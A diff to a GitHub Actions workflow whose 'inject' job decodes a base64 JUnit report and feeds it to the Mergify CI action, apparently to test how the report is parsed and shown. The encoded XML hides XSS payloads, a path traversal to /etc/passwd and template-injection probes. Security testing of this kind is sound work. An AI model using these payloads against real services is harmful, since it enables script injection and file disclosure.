@@ -7,8 +7,9 @@ jobs:
   inject:
     runs-on: ubuntu-latest
     steps:
-      - run: echo PHRlc3RzdWl0ZXM+PHRlc3RzdWl0ZSBuYW1lPSJwbF8mbHQ7aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSkmZ3Q7IiB0ZXN0cz0iMSIgZmFpbHVyZXM9IjEiPjx0ZXN0Y2FzZSBuYW1lPSJ0XyZsdDtzdmcvb25sb2FkPWFsZXJ0KGRvY3VtZW50LmRvbWFpbikmZ3Q7IiBjbGFzc25hbWU9ImNfJmx0O3NjcmlwdCZndDt4Jmx0Oy9zY3JpcHQmZ3Q7IiBmaWxlPSIuLi8uLi8uLi9ldGMvcGFzc3dkIj48ZmFpbHVyZSBtZXNzYWdlPSJNU0cgJmx0O3NjcmlwdCZndDthbGVydCgyKSZsdDsvc2NyaXB0Jmd0OyB7ezcqN319IiB0eXBlPSJFIj5TVEFDSyAmbHQ7c3ZnIG9ubG9hZD1hbGVydCgzKSZndDsge3tjb25maWd9fTwvZmFpbHVyZT48L3Rlc3RjYXNlPjwvdGVzdHN1aXRlPjwvdGVzdHN1aXRlcz4= | base64 -d > j.xml
+      - run: echo PHRlc3RzdWl0ZXM+PHRlc3RzdWl0ZSBuYW1lPSJwbF8mbHQ7aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSkmZ3Q7IiB0ZXN0cz0iMSIgZmFpbHVyZXM9IjEiPjx0ZXN0Y2FzZSBuYW1lPSJ0XyZsdDtzdmcvb25sb2FkPWFsZXJ0KGRvY3VtZW50LmRvbWFpbikmZ3Q7IiBjbGFzc25hbWU9ImNfJmx0O3NjcmlwdCZndDt4Jmx0Oy9zY3JpcHQmZ3Q7IiBmaWxlPSIuLi8uLi8uLi9ldGMvcGFzc3dkIj48ZmFpbHVyZSBtZXNzYWdlPSJNU0cgJmx0O3NjcmlwdCZndDthbGVydCgyKSZsdDsvc2NyaXB0Jmd0OyB7ezcqN319IiB0eXBlPSJFIj5TVEFDSyAmbHQ7c3ZnIG9ubG9hZD1hbGVydCgzKSZndDs8L2ZhaWx1cmU+PC90ZXN0Y2FzZT48L3Rlc3RzdWl0ZT48L3Rlc3RzdWl0ZXM+ | base64 -d > j.xml
       - uses: Mergifyio/gha-mergify-ci@main
         with:
           report_path: j.xml
-
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
